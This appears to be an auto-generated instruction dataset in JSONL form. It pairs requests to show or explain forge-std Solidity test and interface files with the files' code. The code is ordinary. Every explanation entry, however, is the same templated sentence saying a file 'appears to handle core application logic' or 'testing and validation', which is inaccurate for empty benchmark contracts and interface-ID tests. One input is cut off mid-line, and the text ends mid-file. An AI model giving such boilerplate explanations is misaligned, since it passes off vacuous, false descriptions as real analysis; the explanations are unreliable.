{"instruction": "Show me the code for StdToml.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdToml.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, stdToml} from \"../src/Test.sol\";\n\ncontract StdTomlTest is Test {\n    using stdToml for string;\n\n    string root;\n    string path;\n\n    function setUp() public {\n        root = vm.projectRoot();\n        path = string.concat(root, \"/test/fixtures/test.toml\");\n    }\n\n    struct SimpleToml {\n        uint256 a;\n        string b;\n    }\n\n    struct NestedToml {\n        uint256 a;\n        string b;\n        SimpleToml c;\n    }\n\n    function test_readToml() public view {\n        string memory json = vm.readFile(path);\n        assertEq(json.readUint(\".a\"), 123);\n    }\n\n    function test_writeToml() public {\n        string memory json = \"json\";\n        json.serialize(\"a\", uint256(123));\n        string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n        string memory finalJson = json.serialize(\"c\", semiFinal);\n        finalJson.write(path);\n\n        string memory toml = vm.readFile(path);\n        bytes memory data = toml.parseRaw(\"$\");\n        NestedToml memory decodedData = abi.decode(data, (NestedToml));\n\n        assertEq(decodedData.a, 123);\n        assertEq(decodedData.b, \"test\");\n        assertEq(decodedData.c.a, 123);\n        assertEq(decodedData.c.b, \"test\");\n    }\n}\n\n```"}
{"instruction": "What does the file StdToml.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, stdToml} from \"../src/Test.sol\";\n\ncontract StdTomlTest is Test {\n    using stdToml for string;\n\n    string root;\n    string path;\n\n    function setUp() public {\n        root = vm.projectRoot();\n        path = string.concat(root, \"/test/fixtures/test.toml\");\n    }\n\n    struct SimpleToml {\n        uint256 a;\n        string b;\n    }\n\n    struct NestedToml {\n        uint256 a;\n        string b;\n        SimpleToml c;\n    }\n\n    function test_readToml() public view {\n        string memory json = vm.readFile(path);\n        assertEq(json.readUint(\".a\"), 123);\n    }\n\n    function test_writeToml() public {\n        string memory json = \"json\";\n        json.serialize(\"a\", uint256(123));\n        string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n        string memory finalJson = json.serialize(\"c\", semiFinal);\n        finalJson.write(path);\n\n        string memory toml = vm.readFile(path);\n        bytes memory data = toml.parseRaw(\"$\");\n        NestedToml memory decodedData = abi.decode(data, (NestedToml));\n\n        assertEq(decodedData.a, 123);\n        assertEq(decodedData.b, \"test\");\n        assertEq(decodedData.c.a, 123);\n        assertEq(decodedData.c.b, \"test\");\n    }\n}\n\n```", "output": "This file `StdToml.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdUtils.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdUtils.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, StdUtils} from \"../src/Test.sol\";\n\ncontract StdUtilsMock is StdUtils {\n    // We deploy a mock version so we can properly test expected reverts.\n    function exposedGetTokenBalances(address token, address[] memory addresses)\n        external\n        returns (uint256[] memory balances)\n    {\n        return getTokenBalances(token, addresses);\n    }\n\n    function exposedBound(int256 num, int256 min, int256 max) external pure returns (int256) {\n        return bound(num, min, max);\n    }\n\n    function exposedBound(uint256 num, uint256 min, uint256 max) external pure returns (uint256) {\n        return bound(num, min, max);\n    }\n\n    function exposedBytesToUint(bytes memory b) external pure returns (uint256) {\n        return bytesToUint(b);\n    }\n}\n\ncontract StdUtilsTest is Test {\n    /*//////////////////////////////////////////////////////////////////////////\n                                     BOUND UINT\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function test_Bound() public pure {\n        assertEq(bound(uint256(5), 0, 4), 0);\n        assertEq(bound(uint256(0), 69, 69), 69);\n        assertEq(bound(uint256(0), 68, 69), 68);\n        assertEq(bound(uint256(10), 150, 190), 174);\n        assertEq(bound(uint256(300), 2800, 3200), 3107);\n        assertEq(bound(uint256(9999), 1337, 6666), 4669);\n    }\n\n    function test_Bound_WithinRange() public pure {\n        assertEq(bound(uint256(51), 50, 150), 51);\n        assertEq(bound(uint256(51), 50, 150), bound(bound(uint256(51), 50, 150), 50, 150));\n        assertEq(bound(uint256(149), 50, 150), 149);\n        assertEq(bound(uint256(149), 50, 150), bound(bound(uint256(149), 50, 150), 50, 150));\n    }\n\n    function test_Bound_EdgeCoverage() public pure {\n        assertEq(bound(uint256(0), 50, 150), 50);\n        assertEq(bound(uint256(1), 50, 150), 51);\n        assertEq(bound(uint256(2), 50, 150), 52);\n        assertEq(bound(uint256(3), 50, 150), 53);\n        assertEq(bound(type(uint256).max, 50, 150), 150);\n        assertEq(bound(type(uint256).max - 1, 50, 150), 149);\n        assertEq(bound(type(uint256).max - 2, 50, 150), 148);\n        assertEq(bound(type(uint256).max - 3, 50, 150), 147);\n    }\n\n    function testFuzz_Bound_DistributionIsEven(uint256 min, uint256 size) public pure {\n        size = size % 100 + 1;\n        min = bound(min, UINT256_MAX / 2, UINT256_MAX / 2 + size);\n        uint256 max = min + size - 1;\n        uint256 result;\n\n        for (uint256 i = 1; i <= size * 4; ++i) {\n            // x > max\n            result = bound(max + i, min, max);\n            assertEq(result, min + (i - 1) % size);\n            // x < min\n            result = bound(min - i, min, max);\n            assertEq(result, max - (i - 1) % size);\n        }\n    }\n\n    function testFuzz_Bound(uint256 num, uint256 min, uint256 max) public pure {\n        if (min > max) (min, max) = (max, min);\n\n        uint256 result = bound(num, min, max);\n\n        assertGe(result, min);\n        assertLe(result, max);\n        assertEq(result, bound(result, min, max));\n        if (num >= min && num <= max) assertEq(result, num);\n    }\n\n    function test_BoundUint256Max() public pure {\n        assertEq(bound(0, type(uint256).max - 1, type(uint256).max), type(uint256).max - 1);\n        assertEq(bound(1, type(uint256).max - 1, type(uint256).max), type(uint256).max);\n    }\n\n    function test_RevertIf_BoundMaxLessThanMin() public {\n        // We deploy a mock version so we can properly test the revert.\n        StdUtilsMock stdUtils = new StdUtilsMock();\n\n        vm.expectRevert(bytes(\"StdUtils bound(uint256,uint256,uint256): Max is less than min.\"));\n        stdUtils.exposedBound(uint256(5), 100, 10);\n    }\n\n    function testFuzz_RevertIf_BoundMaxLessThanMin(uint256 num, uint256 min, uint256 max) public {\n        // We deploy a mock version so we can properly test the revert.\n        StdUtilsMock stdUtils = new StdUtilsMock();\n\n        vm.assume(min > max);\n        vm.expectRevert(bytes(\"StdUtils bound(uint256,uint256,uint256): Max is less than min.\"));\n        stdUtils.exposedBound(num, min, max);\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                     BOUND INT\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function test_BoundInt() public pure {\n        assertEq(bound(-3, 0, 4), 2);\n        assertEq(bound(0, -69, -69), -69);\n        assertEq(bound(0, -69, -68), -68);\n        assertEq(bound(-10, 150, 190), 154);\n        assertEq(bound(-300, 2800, 3200), 2908);\n        assertEq(bound(9999, -1337, 6666), 1995);\n    }\n\n    function test_BoundInt_WithinRange() public pure {\n        assertEq(bound(51, -50, 150), 51);\n        assertEq(bound(51, -50, 150), bound(bound(51, -50, 150), -50, 150));\n        assertEq(bound(149, -50, 150), 149);\n        assertEq(bound(149, -50, 150), bound(bound(149, -50, 150), -50, 150));\n    }\n\n    function test_BoundInt_EdgeCoverage() public pure {\n        assertEq(bound(type(int256).min, -50, 150), -50);\n        assertEq(bound(type(int256).min + 1, -50, 150), -49);\n        assertEq(bound(type(int256).min + 2, -50, 150), -48);\n        assertEq(bound(type(int256).min + 3, -50, 150), -47);\n        assertEq(bound(type(int256).min, 10, 150), 10);\n        assertEq(bound(type(int256).min + 1, 10, 150), 11);\n        assertEq(bound(type(int256).min + 2, 10, 150), 12);\n        assertEq(bound(type(int256).min + 3, 10, 150), 13);\n\n        assertEq(bound(type(int256).max, -50, 150), 150);\n        assertEq(bound(type(int256).max - 1, -50, 150), 149);\n        assertEq(bound(type(int256).max - 2, -50, 150), 148);\n        assertEq(bound(type(int256).max - 3, -50, 150), 147);\n        assertEq(bound(type(int256).max, -50, -10), -10);\n        assertEq(bound(type(int256).max - 1, -50, -10), -11);\n        assertEq(bound(type(int256).max - 2, -50, -10), -12);\n        assertEq(bound(type(int256).max - 3, -50, -10), -13);\n    }\n\n    function testFuzz_BoundInt_DistributionIsEven(int256 min, uint256 size) public pure {\n        size = size % 100 + 1;\n        min = bound(min, -int256(size / 2), int256(size - size / 2));\n        int256 max = min + int256(size) - 1;\n        int256 result;\n\n        for (uint256 i = 1; i <= size * 4; ++i) {\n            // x > max\n            result = bound(max + int256(i), min, max);\n            assertEq(result, min + int256((i - 1) % size));\n            // x < min\n            result = bound(min - int256(i), min, max);\n            assertEq(result, max - int256((i - 1) % size));\n        }\n    }\n\n    function testFuzz_BoundInt(int256 num, int256 min, int256 max) public pure {\n        if (min > max) (min, max) = (max, min);\n\n        int256 result = bound(num, min, max);\n\n        assertGe(result, min);\n        assertLe(result, max);\n        assertEq(result, bound(result, min, max));\n        if (num >= min && num <= max) assertEq(result, num);\n    }\n\n    function test_BoundIntInt256Max() public pure {\n        assertEq(bound(0, type(int256).max - 1, type(int256).max), type(int256).max - 1);\n        assertEq(bound(1, type(int256).max - 1, type(int256).max), type(int256).max);\n    }\n\n    function test_BoundIntInt256Min() public pure {\n        assertEq(bound(0, type(int256).min, type(int256).min + 1), type(int256).min);\n        assertEq(bound(1, type(int256).min, type(int256).min + 1), type(int256).min + 1);\n    }\n\n    function test_RevertIf_BoundIntMaxLessThanMin() public {\n        // We deploy a mock version so we can properly test the revert.\n        StdUtilsMock stdUtils = new StdUtilsMock();\n\n        vm.expectRevert(bytes(\"StdUtils bound(int256,int256,int256): Max is less than min.\"));\n        stdUtils.exposedBound(-5, 100, 10);\n    }\n\n    function testFuzz_RevertIf_BoundIntMaxLessThanMin(int256 num, int256 min, int256 max) public {\n        // We deploy a mock version so we can properly test the revert.\n        StdUtilsMock stdUtils = new StdUtilsMock();\n\n        vm.assume(min > max);\n        vm.expectRevert(bytes(\"StdUtils bound(int256,int256,int256): Max is less than min.\"));\n        stdUtils.exposedBound(num, min, max);\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                BOUND PRIVATE KEY\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function test_BoundPrivateKey() public pure {\n        assertEq(boundPrivateKey(0), 1);\n        assertEq(boundPrivateKey(1), 1);\n        assertEq(boundPrivateKey(300), 300);\n        assertEq(boundPrivateKey(9999), 9999);\n        assertEq(boundPrivateKey(SECP256K1_ORDER - 1), SECP256K1_ORDER - 1);\n        assertEq(boundPrivateKey(SECP256K1_ORDER), 1);\n        assertEq(boundPrivateKey(SECP256K1_ORDER + 1), 2);\n        assertEq(boundPrivateKey(UINT256_MAX), UINT256_MAX & SECP256K1_ORDER - 1); // x&y is equivalent to x-x%y\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                   BYTES TO UINT\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function test_BytesToUint() external pure {\n        bytes memory maxUint = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\";\n        bytes memory two = hex\"02\";\n        bytes memory millionEther = hex\"d3c21bcecceda1000000\";\n\n        assertEq(bytesToUint(maxUint), type(uint256).max);\n        assertEq(bytesToUint(two), 2);\n        assertEq(bytesToUint(millionEther), 1_000_000 ether);\n    }\n\n    function test_RevertIf_BytesLengthExceeds32() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdUtilsMock stdUtils = new StdUtilsMock();\n\n        bytes memory thirty3Bytes = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\";\n        vm.expectRevert(\"StdUtils bytesToUint(bytes): Bytes length exceeds 32.\");\n        stdUtils.exposedBytesToUint(thirty3Bytes);\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                               COMPUTE CREATE ADDRESS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function test_ComputeCreateAddress() external pure {\n        address deployer = 0x6C9FC64A53c1b71FB3f9Af64d1ae3A4931A5f4E9;\n        uint256 nonce = 14;\n        address createAddress = computeCreateAddress(deployer, nonce);\n        assertEq(createAddress, 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                              COMPUTE CREATE2 ADDRESS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function test_ComputeCreate2Address() external pure {\n        bytes32 salt = bytes32(uint256(31415));\n        bytes32 initcodeHash = keccak256(abi.encode(0x6080));\n        address deployer = 0x6C9FC64A53c1b71FB3f9Af64d1ae3A4931A5f4E9;\n        address create2Address = computeCreate2Address(salt, initcodeHash, deployer);\n        assertEq(create2Address, 0xB147a5d25748fda14b463EB04B111027C290f4d3);\n    }\n\n    function test_ComputeCreate2AddressWithDefaultDeployer() external pure {\n        bytes32 salt = 0xc290c670fde54e5ef686f9132cbc8711e76a98f0333a438a92daa442c71403c0;\n        bytes32 initcodeHash = hashInitCode(hex\"6080\", \"\");\n        assertEq(initcodeHash, 0x1a578b7a4b0b5755db6d121b4118d4bc68fe170dca840c59bc922f14175a76b0);\n        address create2Address = computeCreate2Address(salt, initcodeHash);\n        assertEq(create2Address, 0xc0ffEe2198a06235aAbFffe5Db0CacF1717f5Ac6);\n    }\n}\n\ncontract StdUtilsForkTest is Test {\n    /*//////////////////////////////////////////////////////////////////////////\n                                  GET TOKEN BALANCES\n    //////////////////////////////////////////////////////////////////////////*/\n\n    address internal SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;\n    address internal SHIB_HOLDER_0 = 0x855F5981e831D83e6A4b4EBFCAdAa68D92333170;\n    address internal SHIB_HOLDER_1 = 0x8F509A90c2e47779cA408Fe00d7A72e359229AdA;\n    address internal SHIB_HOLDER_2 = 0x0e3bbc0D04fF62211F71f3e4C45d82ad76224385;\n\n    address internal USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n    address internal USDC_HOLDER_0 = 0xDa9CE944a37d218c3302F6B82a094844C6ECEb17;\n    address internal USDC_HOLDER_1 = 0x3e67F4721E6d1c41a015f645eFa37BEd854fcf52;\n\n    function setUp() public {\n        // All tests of the `getTokenBalances` method are fork tests using live contracts.\n        vm.createSelectFork({urlOrAlias: \"mainnet\", blockNumber: 16_428_900});\n    }\n\n    function test_RevertIf_CannotGetTokenBalances_NonTokenContract() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdUtilsMock stdUtils = new StdUtilsMock();\n\n        // The UniswapV2Factory contract has neither a `balanceOf` function nor a fallback function,\n        // so the `balanceOf` call should revert.\n        address token = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);\n        address[] memory addresses = new address[](1);\n        addresses[0] = USDC_HOLDER_0;\n\n        vm.expectRevert(\"Multicall3: call failed\");\n        stdUtils.exposedGetTokenBalances(token, addresses);\n    }\n\n    function test_RevertIf_CannotGetTokenBalances_EOA() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdUtilsMock stdUtils = new StdUtilsMock();\n\n        address eoa = vm.addr({privateKey: 1});\n        address[] memory addresses = new address[](1);\n        addresses[0] = USDC_HOLDER_0;\n        vm.expectRevert(\"StdUtils getTokenBalances(address,address[]): Token address is not a contract.\");\n        stdUtils.exposedGetTokenBalances(eoa, addresses);\n    }\n\n    function test_GetTokenBalances_Empty() external {\n        address[] memory addresses = new address[](0);\n        uint256[] memory balances = getTokenBalances(USDC, addresses);\n        assertEq(balances.length, 0);\n    }\n\n    function test_GetTokenBalances_USDC() external {\n        address[] memory addresses = new address[](2);\n        addresses[0] = USDC_HOLDER_0;\n        addresses[1] = USDC_HOLDER_1;\n        uint256[] memory balances = getTokenBalances(USDC, addresses);\n        assertEq(balances[0], 159_000_000_000_000);\n        assertEq(balances[1], 131_350_000_000_000);\n    }\n\n    function test_GetTokenBalances_SHIB() external {\n        address[] memory addresses = new address[](3);\n        addresses[0] = SHIB_HOLDER_0;\n        addresses[1] = SHIB_HOLDER_1;\n        addresses[2] = SHIB_HOLDER_2;\n        uint256[] memory balances = getTokenBalances(SHIB, addresses);\n        assertEq(balances[0], 3_323_256_285_484.42e18);\n        assertEq(balances[1], 1_271_702_771_149.99999928e18);\n        assertEq(balances[2], 606_357_106_247e18);\n    }\n}\n\n```"}
{"instruction": "What does the file StdUtils.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, StdUtils} from \"../src/Test.sol\";\n\ncontract StdUtilsMock is StdUtils {\n    // We deploy a mock version so we can properly test expected reverts.\n    function exposedGetTokenBalances(address token, address[] memory addresses)\n        external\n        returns (uint256[] memory balances)\n    {\n        return getTokenBalances(token, addresses);\n    }\n\n    function exposedBound(int256 num, int256 min, int256 max) external pure returns (int256) {\n        return bound(num, min, max);\n    }\n\n    function exposedBound(uint256 num, uint256 min, uint256 max) external pure returns (uint256) {\n        return bound(num, min, max);\n    }\n\n    function exposedBytesToUint(bytes memory b) external pure returns (uint256) {\n        return bytesToUint(b);\n    }\n}\n\ncontract StdUtilsTest is Test {\n    /*//////////////////////////////////////////////////////////////////////////\n                                     BOUND UINT\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function test_Bound() public pure {\n        assertEq(bound(uint256(5), 0, 4), 0);\n        assertEq(bound(uint256(0), 69, 69), 69);\n        assertEq(bound(uint256(0), 68, 69), 68);\n        assertEq(bound(uint256(10), 150, 190), 174);\n        assertEq(bound(uint256(300), 2800, 3200), 3107);\n        assertEq(bound(uint256(9999), 1337, 6666), 4669);\n    }\n\n    function test_Bound_WithinRange() public pure {\n        assertEq(bound(uint256(51), 50, 150), 51);\n        assertEq(bound(uint256(51), 50, 150), bound(bound(uint256(51), 50, 150), 50, 150));\n        assertEq(bound(uint256(149), 50, 150), 149);\n        assertEq(bound(uint256(149), 50, 150), bound(bound(uint256(149), 50, 150), 50, 150));\n    }\n\n    function test_Bound_EdgeCoverage() public pure {\n        assertEq(bound(uint256(0), 50, 150), 50);\n        assertEq(bound(uint256(1), 50, 150), 51);\n        assertEq(bound(uint256(2), 50, 150), 52)\n```", "output": "This file `StdUtils.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Vm.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\Vm.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test} from \"../src/Test.sol\";\nimport {Vm, VmSafe} from \"../src/Vm.sol\";\n\n// These tests ensure that functions are never accidentally removed from a Vm interface, or\n// inadvertently moved between Vm and VmSafe. These tests must be updated each time a function is\n// added to or removed from Vm or VmSafe.\ncontract VmTest is Test {\n    function test_VmInterfaceId() public pure {\n        assertEq(type(Vm).interfaceId, bytes4(0xe835828d), \"Vm\");\n    }\n\n    function test_VmSafeInterfaceId() public pure {\n        assertEq(type(VmSafe).interfaceId, bytes4(0x7f58f7be), \"VmSafe\");\n    }\n}\n\n```"}
{"instruction": "What does the file Vm.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test} from \"../src/Test.sol\";\nimport {Vm, VmSafe} from \"../src/Vm.sol\";\n\n// These tests ensure that functions are never accidentally removed from a Vm interface, or\n// inadvertently moved between Vm and VmSafe. These tests must be updated each time a function is\n// added to or removed from Vm or VmSafe.\ncontract VmTest is Test {\n    function test_VmInterfaceId() public pure {\n        assertEq(type(Vm).interfaceId, bytes4(0xe835828d), \"Vm\");\n    }\n\n    function test_VmSafeInterfaceId() public pure {\n        assertEq(type(VmSafe).interfaceId, bytes4(0x7f58f7be), \"VmSafe\");\n    }\n}\n\n```", "output": "This file `Vm.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for CompilationScript.sol which is part of the compilation project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\compilation\\CompilationScript.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Script} from \"../../src/Script.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationScript is Script {}\n\n```"}
{"instruction": "What does the file CompilationScript.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Script} from \"../../src/Script.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationScript is Script {}\n\n```", "output": "This file `CompilationScript.sol` is part of the compilation project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for CompilationScriptBase.sol which is part of the compilation project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\compilation\\CompilationScriptBase.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {ScriptBase} from \"../../src/Script.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationScriptBase is ScriptBase {}\n\n```"}
{"instruction": "What does the file CompilationScriptBase.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {ScriptBase} from \"../../src/Script.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationScriptBase is ScriptBase {}\n\n```", "output": "This file `CompilationScriptBase.sol` is part of the compilation project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for CompilationTest.sol which is part of the compilation project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\compilation\\CompilationTest.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test} from \"../../src/Test.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationTest is Test {}\n\n```"}
{"instruction": "What does the file CompilationTest.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test} from \"../../src/Test.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationTest is Test {}\n\n```", "output": "This file `CompilationTest.sol` is part of the compilation project. Based on the code structure, it appears to handle testing and validation."}
{"instruction": "Show me the code for CompilationTestBase.sol which is part of the compilation project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\compilation\\CompilationTestBase.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {TestBase} from \"../../src/Test.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationTestBase is TestBase {}\n\n```"}
{"instruction": "What does the file CompilationTestBase.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {TestBase} from \"../../src/Test.sol\";\n\n// The purpose of this contract is to benchmark compilation time to avoid accidentally introducing\n// a change that results in very long compilation times with via-ir. See https://github.com/foundry-rs/forge-std/issues/207\ncontract CompilationTestBase is TestBase {}\n\n```", "output": "This file `CompilationTestBase.sol` is part of the compilation project. Based on the code structure, it appears to handle testing and validation."}
{"instruction": "Show me the code for IERC1155.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC1155.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @title ERC-1155 Multi Token Standard\n/// @dev See https://eips.ethereum.org/EIPS/eip-1155\n/// Note: The ERC-165 identifier for this interface is 0xd9b67a26.\ninterface IERC1155 is IERC165 {\n    /// @dev\n    /// - Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred, including zero value transfers as well as minting or burning (see \"Safe Transfer Rules\" section of the standard).\n    /// - The `_operator` argument MUST be the address of an account/contract that is approved to make the transfer (SHOULD be msg.sender).\n    /// - The `_from` argument MUST be the address of the holder whose balance is decreased.\n    /// - The `_to` argument MUST be the address of the recipient whose balance is increased.\n    /// - The `_id` argument MUST be the token type being transferred.\n    /// - The `_value` argument MUST be the number of tokens the holder balance is decreased by and match what the recipient balance is increased by.\n    /// - When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).\n    /// - When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).\n    event TransferSingle(\n        address indexed _operator, address indexed _from, address indexed _to, uint256 _id, uint256 _value\n    );\n\n    /// @dev\n    /// - Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred, including zero value transfers as well as minting or burning (see \"Safe Transfer Rules\" section of the standard).\n    /// - The `_operator` argument MUST be the address of an account/contract that is approved to make the transfer (SHOULD be msg.sender).\n    /// - The `_from` argument MUST be the address of the holder whose balance is decreased.\n    /// - The `_to` argument MUST be the address of the recipient whose balance is increased.\n    /// - The `_ids` argument MUST be the list of tokens being transferred.\n    /// - The `_values` argument MUST be the list of number of tokens (matching the list and order of tokens specified in _ids) the holder balance is decreased by and match what the recipient balance is increased by.\n    /// - When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).\n    /// - When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).\n    event TransferBatch(\n        address indexed _operator, address indexed _from, address indexed _to, uint256[] _ids, uint256[] _values\n    );\n\n    /// @dev MUST emit when approval for a second party/operator address to manage all tokens for an owner address is enabled or disabled (absence of an event assumes disabled).\n    event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);\n\n    /// @dev MUST emit when the URI is updated for a token ID. URIs are defined in RFC 3986.\n    /// The URI MUST point to a JSON file that conforms to the \"ERC-1155 Metadata URI JSON Schema\".\n    event URI(string _value, uint256 indexed _id);\n\n    /// @notice Transfers `_value` amount of an `_id` from the `_from` address to the `_to` address specified (with safety call).\n    /// @dev Caller must be approved to manage the tokens being transferred out of the `_from` account (see \"Approval\" section of the standard).\n    /// - MUST revert if `_to` is the zero address.\n    /// - MUST revert if balance of holder for token `_id` is lower than the `_value` sent.\n    /// - MUST revert on any other error.\n    /// - MUST emit the `TransferSingle` event to reflect the balance change (see \"Safe Transfer Rules\" section of the standard).\n    /// - After the above conditions are met, this function MUST check if `_to` is a smart contract (e.g. code size > 0). If so, it MUST call `onERC1155Received` on `_to` and act appropriately (see \"Safe Transfer Rules\" section of the standard).\n    /// @param _from Source address\n    /// @param _to Target address\n    /// @param _id ID of the token type\n    /// @param _value Transfer amount\n    /// @param _data Additional data with no specified format, MUST be sent unaltered in call to `onERC1155Received` on `_to`\n    function safeTransferFrom(address _from, address _to, uint256 _id, uint256 _value, bytes calldata _data) external;\n\n    /// @notice Transfers `_values` amount(s) of `_ids` from the `_from` address to the `_to` address specified (with safety call).\n    /// @dev Caller must be approved to manage the tokens being transferred out of the `_from` account (see \"Approval\" section of the standard).\n    /// - MUST revert if `_to` is the zero address.\n    /// - MUST revert if length of `_ids` is not the same as length of `_values`.\n    /// - MUST revert if any of the balance(s) of the holder(s) for token(s) in `_ids` is lower than the respective amount(s) in `_values` sent to the recipient.\n    /// - MUST revert on any other error.\n    /// - MUST emit `TransferSingle` or `TransferBatch` event(s) such that all the balance changes are reflected (see \"Safe Transfer Rules\" section of the standard).\n    /// - Balance changes and events MUST follow the ordering of the arrays (_ids[0]/_values[0] before _ids[1]/_values[1], etc).\n    /// - After the above conditions for the transfer(s) in the batch are met, this function MUST check if `_to` is a smart contract (e.g. code size > 0). If so, it MUST call the relevant `ERC1155TokenReceiver` hook(s) on `_to` and act appropriately (see \"Safe Transfer Rules\" section of the standard).\n    /// @param _from Source address\n    /// @param _to Target address\n    /// @param _ids IDs of each token type (order and length must match _values array)\n    /// @param _values Transfer amounts per token type (order and length must match _ids array)\n    /// @param _data Additional data with no specified format, MUST be sent unaltered in call to the `ERC1155TokenReceiver` hook(s) on `_to`\n    function safeBatchTransferFrom(\n        address _from,\n        address _to,\n        uint256[] calldata _ids,\n        uint256[] calldata _values,\n        bytes calldata _data\n    ) external;\n\n    /// @notice Get the balance of an account's tokens.\n    /// @param _owner The address of the token holder\n    /// @param _id ID of the token\n    /// @return The _owner's balance of the token type requested\n    function balanceOf(address _owner, uint256 _id) external view returns (uint256);\n\n    /// @notice Get the balance of multiple account/token pairs\n    /// @param _owners The addresses of the token holders\n    /// @param _ids ID of the 